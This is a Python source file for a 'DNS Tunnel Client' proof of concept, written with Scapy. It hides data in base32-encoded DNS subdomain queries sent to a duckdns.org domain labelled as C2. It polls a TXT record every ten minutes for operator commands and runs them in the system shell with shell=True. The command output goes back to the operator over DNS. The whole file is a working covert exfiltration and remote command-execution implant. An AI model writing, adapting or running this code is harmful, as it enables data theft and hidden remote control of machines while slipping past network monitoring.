#!/usr/bin/env python3
"""
DNS Tunnel Client - PoC
Exfiltrates data by encoding it into DNS subdomain queries.
Polls for operator commands every 10 minutes via TXT record response.

Setup:
  - Run: python dns_tunnel_client.py
  - Queries are routed through the device's configured DNS server
    (auto-detected at startup; falls back to 8.8.8.8).

Data query format:
  <b32chunk>.<seq>.<total>.<sessionid>.d.test.duckdns.org  (A query)

Command query format:
  command.test.duckdns.org  (TXT query)
  Response TXT value: base32-encoded command string, or literal "NONE"
"""

import base64
import platform
import re
import socket
import subprocess
import threading
import time
import random
import string
import sys

from scapy.all import IP, UDP, send, sr1, conf
from scapy.layers.dns import DNS, DNSQR, DNSRR


# ---------------------------------------------------------------------------
# DNS server discovery
# ---------------------------------------------------------------------------

def _get_system_dns() -> str:
    """
    Return the device's first configured DNS server.
    Falls back to 8.8.8.8 if nothing can be determined.
    """
    system = platform.system()
    candidates = []

    if system == "Windows":
        try:
            out = subprocess.check_output(
                ["netsh", "interface", "ip", "show", "dns"],
                stderr=subprocess.DEVNULL,
                text=True,
                timeout=5,
            )
            # Each valid IPv4 on a DNS-related line counts as a candidate.
            for line in out.splitlines():
                if re.search(r"DNS", line, re.IGNORECASE):
                    m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", line)
                    if m:
                        candidates.append(m.group(1))
        except Exception:
            pass
    else:
        # Linux / macOS
        try:
            with open("/etc/resolv.conf") as fh:
                for line in fh:
                    if line.startswith("nameserver"):
                        parts = line.split()
                        if len(parts) >= 2:
                            candidates.append(parts[1])
        except Exception:
            pass

    return candidates[0] if candidates else "8.8.8.8"


def _resolve_c2_ip() -> str:
    """
    Resolve DOMAIN to an IPv4 address using the OS resolver stack.
    socket.getaddrinfo() honours whatever DNS the system has configured,
    so no Npcap or raw-socket privileges are required here.
    """
    try:
        results = socket.getaddrinfo(DOMAIN, None, socket.AF_INET)
        if results:
            return results[0][4][0]
    except socket.gaierror as exc:
        raise RuntimeError(f"Could not resolve {DOMAIN}: {exc}") from exc
    raise RuntimeError(f"Could not resolve {DOMAIN}: no A records returned")


def _outbound_iface(dst_ip: str) -> str:
    """
    Return the Scapy interface name that the OS would use to reach dst_ip.
    conf.route.route() mirrors the kernel routing table, so it picks correctly
    even when VPN adapters, virtual NICs, or multiple physical NICs are present.
    """
    iface, _, _ = conf.route.route(dst_ip)
    return iface


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DOMAIN          = "cwmkaeg.duckdns.org"
DNS_SERVER      = ""                    # resolved in __main__ via _resolve_c2_ip()
COMMAND_INTERVAL = 600                  # seconds between command polls (10 min)
CHUNK_SIZE      = 50                    # base32 chars per DNS label (≈31 raw bytes)
QUERY_DELAY     = 0.5                   # seconds between consecutive chunk queries

conf.verb = 0  # suppress Scapy output


# ---------------------------------------------------------------------------
# Encoding helpers
# ---------------------------------------------------------------------------

def _b32enc(data: bytes) -> str:
    """Base32-encode bytes, strip padding (= is not DNS-safe)."""
    return base64.b32encode(data).decode().rstrip("=").lower()


def _b32dec(s: str) -> bytes:
    """Decode base32 string, re-adding padding as needed."""
    s = s.upper()
    padding = (8 - len(s) % 8) % 8
    return base64.b32decode(s + "=" * padding)


def _gen_session() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


# ---------------------------------------------------------------------------
# DNS helpers
# ---------------------------------------------------------------------------

def _query_a(qname: str) -> None:
    """Fire-and-forget DNS A query (no wait for response)."""
    pkt = IP(dst=DNS_SERVER) / UDP(sport=random.randint(1024, 65534), dport=53) / DNS(
        rd=1,
        qd=DNSQR(qname=qname, qtype="A"),
    )
    send(pkt, verbose=0)


def _query_txt(qname: str):
    """
    Send a DNS TXT query via Scapy sr1() on the dynamically detected outbound
    interface, then wait for and return the matching response packet.
    """
    iface = _outbound_iface(DNS_SERVER)
    pkt = IP(dst=DNS_SERVER) / UDP(sport=random.randint(1024, 65534), dport=53) / DNS(
        rd=1,
        qd=DNSQR(qname=qname, qtype="TXT"),
    )
    return sr1(pkt, iface=iface, timeout=5, verbose=0)


def _extract_txt(resp) -> str | None:
    """Pull the first TXT rdata value out of a DNS response packet."""
    if resp is None or not resp.haslayer(DNS):
        return None
    dns = resp[DNS]
    if dns.ancount == 0:
        return None
    rr = dns.an
    while rr:
        if hasattr(rr, "type") and rr.type == 16:   # TXT
            raw = rr.rdata
            if isinstance(raw, (list, tuple)):
                raw = b"".join(raw)
            if isinstance(raw, bytes):
                return raw.decode("utf-8", errors="ignore").strip()
            return str(raw).strip()
        # traverse linked-list of RRs
        payload = getattr(rr, "payload", None)
        if payload is None or payload.__class__.__name__ == "NoPayload":
            break
        rr = payload
    return None


# ---------------------------------------------------------------------------
# Exfiltration
# ---------------------------------------------------------------------------

def exfiltrate(data, session_id: str = None) -> None:
    """
    Encode `data` and send it to the server as a series of DNS A queries.
    `data` may be str or bytes.
    """
    if isinstance(data, str):
        data = data.encode("utf-8")

    session_id = session_id or _gen_session()
    encoded = _b32enc(data)
    chunks = [encoded[i : i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    total = len(chunks)

    print(f"[*] Exfiltrating {len(data)} byte(s) → {total} chunk(s), session={session_id}")

    for idx, chunk in enumerate(chunks):
        # format: <chunk>.<seq>.<total>.<session>.d.<domain>
        qname = f"{chunk}.{idx}.{total}.{session_id}.d.{DOMAIN}"
        print(f"    [{idx + 1}/{total}] {qname[:70]}{'...' if len(qname) > 70 else ''}")
        _query_a(qname)
        time.sleep(QUERY_DELAY)

    print(f"[*] Exfiltration complete (session={session_id})")


# ---------------------------------------------------------------------------
# Command execution
# ---------------------------------------------------------------------------

def _execute_command(shell_cmd: str) -> None:
    """
    Run shell_cmd in the system shell, capture stdout+stderr, and exfiltrate
    the combined output back to the C2 as DNS A queries.
    On Windows shell=True invokes cmd.exe; on Linux/macOS it invokes /bin/sh.
    """
    print(f"[*] Executing: {shell_cmd}")
    try:
        result = subprocess.run(
            shell_cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = result.stdout + result.stderr
        if not output.strip():
            output = f"[exit {result.returncode}]"
    except subprocess.TimeoutExpired:
        output = "[ERROR] command timed out after 30s"
    except Exception as exc:
        output = f"[ERROR] {exc}"

    print(f"[*] Sending output ({len(output)} bytes) to C2...")
    exfiltrate(output)


# ---------------------------------------------------------------------------
# Command polling
# ---------------------------------------------------------------------------

def _poll_once() -> None:
    """Check command.DOMAIN for a pending operator command."""
    print("[*] Polling for commands...")
    resp = _query_txt(f"command.{DOMAIN}")
    txt = _extract_txt(resp)

    if txt is None or txt.upper() == "NONE":
        print("[*] No command pending.")
        return

    try:
        cmd = _b32dec(txt).decode("utf-8")
    except Exception:
        cmd = txt  # fallback: show raw value

    print("\n" + "!" * 60)
    print(f"[!!!] COMMAND RECEIVED: {cmd}")
    print("!" * 60 + "\n")

    if cmd.lower().startswith("bash "):
        shell_cmd = cmd[5:]
        threading.Thread(target=_execute_command, args=(shell_cmd,), daemon=True).start()


def _command_poll_loop() -> None:
    """Background thread: poll for commands on a fixed interval."""
    while True:
        time.sleep(COMMAND_INTERVAL)
        try:
            _poll_once()
        except Exception as exc:
            print(f"[!] Command poll error: {exc}")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    resolver = _get_system_dns()
    print(f"[*] Resolver : {resolver}")
    print(f"[*] Resolving {DOMAIN} ...")
    try:
        DNS_SERVER = _resolve_c2_ip()
    except RuntimeError as exc:
        print(f"[!] {exc}")
        sys.exit(1)

    print("=" * 60)
    print("  DNS Tunnel Client - PoC")
    print(f"  C2 IP:    {DNS_SERVER}  (resolved from {DOMAIN})")
    print(f"  Resolver: {resolver}")
    print(f"  Cmd poll: every {COMMAND_INTERVAL}s")
    print("=" * 60)
    print("[*] Starting command poll thread (first poll in 10 min)…")

    threading.Thread(target=_command_poll_loop, daemon=True).start()

    print("[*] Enter data to exfiltrate (one line at a time). Ctrl+C to quit.\n")
    try:
        while True:
            try:
                data = input("exfil> ").strip()
            except EOFError:
                break
            if data:
                exfiltrate(data)
    except KeyboardInterrupt:
        pass

    print("\n[*] Client stopped.")
